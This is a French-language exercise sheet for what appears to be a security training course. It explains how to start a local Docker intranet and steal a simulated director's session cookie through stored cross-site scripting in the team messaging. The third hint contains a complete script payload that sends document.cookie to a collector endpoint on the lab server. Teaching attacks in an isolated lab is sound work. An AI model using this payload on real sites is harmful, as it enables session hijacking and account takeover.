**Objectif** : voler le jeton de la directrice, Claire Morel. Elle lit la messagerie interne toutes les 20 secondes.

## Lancer l'intranet Morel

Il faut [Docker](https://docs.docker.com/get-docker/). La même cible sert aux labs des modules 6 et 7. L'image embarque un vrai navigateur pour simuler la directrice : compte environ 1 Go et quelques minutes pour la première construction.

```bash
docker build -t breche/intranet https://github.com/loan-heron/projetFable.git#claude/project-thread-5ylzcz:breche/cibles/intranet
docker run --rm -p 127.0.0.1:8091:8091 breche/intranet
```

Ouvre http://127.0.0.1:8091 et connecte-toi avec le compte du stagiaire : `stagiaire` / `stagiaire`.

## Ce que tu as

- La messagerie, que toute l'équipe lit.
- Un **collecteur** qui joue le rôle de ton serveur d'attaquant : toute requête vers `/collecteur/...` est notée dans http://127.0.0.1:8091/collecteur-journal. Tu n'as besoin d'aucun service extérieur.

## Indices

<details><summary>Indice 1</summary>Publie un message contenant <code>&lt;b&gt;essai&lt;/b&gt;</code>. Le texte est-il en gras ?</details>
<details><summary>Indice 2</summary>Ton script s'exécutera dans le navigateur de la directrice, qui a un cookie que tu n'as pas. Fais-lui envoyer <code>document.cookie</code> vers le collecteur.</details>
<details><summary>Indice 3</summary><code>&lt;script&gt;new Image().src='/collecteur/?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</code> puis attends 20 secondes et ouvre le journal.</details>
